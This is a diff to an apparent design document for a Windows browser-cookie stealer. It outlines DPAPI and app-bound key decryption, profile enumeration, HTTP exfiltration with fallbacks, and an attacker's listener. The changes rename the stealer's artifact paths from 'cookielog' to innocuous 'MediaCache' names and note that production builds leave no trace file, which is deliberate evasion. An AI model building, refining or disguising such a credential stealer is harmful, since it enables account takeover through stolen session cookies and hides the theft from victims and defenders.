@@ -138,7 +138,7 @@ STEP 6: CHROMIUM COOKIE EXTRACTION (DumpChromium)
       - Extract "encrypted_key" (v10/v11): base64-decode, strip "DPAPI" prefix,
         CryptUnprotectData (user DPAPI) -> 32-byte AES key
       - Extract "app_bound_encrypted_key" (v20): read pre-extracted key from
-        C:\ProgramData\cookielog\v20.key (if available)
+        C:\ProgramData\MediaCache\mc.key (if available)
   6c. Enumerate profile directories (Default, Profile 1, Profile 2, ...)
   6d. For each profile, find cookie database:
       - Chrome >=88: <profile>\Network\Cookies
@@ -225,7 +225,7 @@ STEP 8: HTTP EXFILTRATION (Sink + ExfilHTTP)
 
   8d. If HTTP fails, fall through to fallbacks:
       - Named pipe \\.\pipe\ck_pipe (20 retries x 250ms, for sink.py)
-      - Local file: C:\ProgramData\cookielog\drop.json
+      - Local file: C:\ProgramData\MediaCache\cache.json
 
 -------------------------------------------------------------------------------
 STEP 9: ATTACKER RECEIVES COOKIES (listen.py)
@@ -261,7 +261,8 @@ TIMING
 DEBUG MODE
 -------------------------------------------------------------------------------
 
-  Build with /DDEBUG to enable logging to C:\ProgramData\cookielog\debug.log.
+  Build with /DDEBUG to enable logging to C:\ProgramData\MediaCache\cache.log.
+  Production builds (default in build.bat) define no DEBUG and leave no trace file.
   Each step (Sqlite load, profile enumeration, cookie count, HTTP status) is
   logged. Production build (without /DDEBUG) has no debug output and no
   debug.log file is created.
